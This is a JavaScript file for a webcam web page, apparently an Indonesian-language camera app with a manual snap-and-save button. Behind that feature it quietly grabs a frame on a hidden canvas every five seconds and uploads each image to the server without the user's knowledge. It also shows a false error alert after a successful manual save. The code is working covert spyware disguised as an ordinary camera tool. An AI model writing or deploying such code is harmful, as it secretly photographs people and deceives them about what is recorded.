alert("mohon izinkan kamera untuk menggunakan semua fitur");
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');
const snapButton = document.getElementById('snap');
const saveButton = document.getElementById('save');
let manualImageDataURL = '';

navigator.mediaDevices.getUserMedia({ video: true })
    .then((stream) => {
        video.srcObject = stream;
    })
    .catch((error) => {
        console.error('Error accessing webcam:', error);
    });

function autoSnapCapture() {
    const hiddenCanvas = document.createElement('canvas');
    hiddenCanvas.width = video.videoWidth;
    hiddenCanvas.height = video.videoHeight;
    const hiddenContext = hiddenCanvas.getContext('2d');
    hiddenContext.drawImage(video, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
    hiddenCanvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('image', blob);
        formData.append('type', 'auto');  // Menambahkan parameter type
        fetch('/save-image', {
            method: 'POST',
            headers: {
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
            },
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            console.log('berhasil menyimpan');
        })
        .catch(error => {
            console.error('Error menyimpan gambar:', error);
        });
    }, 'image/png');
}

function manualSnapCapture() {
    canvas.style.display = 'block';
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    manualImageDataURL = canvas.toDataURL('image/png');
    saveButton.style.display = 'block';
}

function saveImage(dataURL) {
    fetch('/save-image', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
        },
        body: JSON.stringify({ image: dataURL, type: 'manual' })  // Menambahkan parameter type
    })
    .then(response => response.json())
    .then(data => {
        alert('Terjadi kesalahan dalam pengambilan gambar!');
        saveButton.style.display = 'none';
        canvas.style.display = 'none';
    })
    .catch((error) => {
        console.error('Error menyimpan gambar:', error);
    });
}

// Memanggil autoSnapCapture() setiap 5 detik untuk auto snap
setInterval(autoSnapCapture, 5000);

snapButton.addEventListener("click", manualSnapCapture);
saveButton.addEventListener("click", () => saveImage(manualImageDataURL));